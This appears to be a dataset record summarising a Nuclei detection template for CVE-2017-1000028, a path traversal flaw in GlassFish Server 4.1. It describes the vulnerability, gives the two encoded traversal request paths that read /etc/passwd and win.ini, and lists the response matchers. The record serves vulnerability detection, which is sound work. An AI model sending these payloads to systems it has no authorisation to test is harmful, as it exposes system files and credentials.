---
cve_id: CVE-2017-1000028
template_path: nuclei-templates/http/cves/2017/CVE-2017-1000028.yaml
affected_product: Oracle GlassFish Server Open Source Edition 4.1
severity: high
authentication: none
external_callback: false
affected_versions: 4.1
preconditions: []
poc_classification: info-leak
---

## Vulnerability
Oracle GlassFish Server Open Source Edition 4.1 is vulnerable to local file inclusion (LFI) via path traversal (CWE-22). The flaw exists in the `/theme/META-INF/` endpoint and can be triggered by specially crafted HTTP GET requests using overlong UTF-8 encoding (`%c0%ae%c0%ae` for `../`). Both authenticated and unauthenticated exploitation paths exist. CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (score 7.5). Unauthenticated attackers can read arbitrary files on the server filesystem, including `/etc/passwd`, configuration files, and database credentials, potentially enabling full server compromise.

## PoC / Detection
Classification: info-leak

The template issues two unauthenticated GET requests (stopping at first match) with path-traversal payloads:
- `{{BaseURL}}/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd`
- `{{BaseURL}}/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini`

Matchers (OR condition) succeed on HTTP 200 responses containing either `root:.*:0:0:` (Linux) or Windows strings (`bit app support`, `fonts`, `extensions`).

## References
- https://www.exploit-db.com/exploits/45196
- https://www.trustwave.com/en-us/resources/security-resources/security-advisories/?fid=18822
- https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-016/?fid=6904
- https://www.exploit-db.com/exploits/45196/
- https://nvd.nist.gov/vuln/detail/CVE-2017-1000028
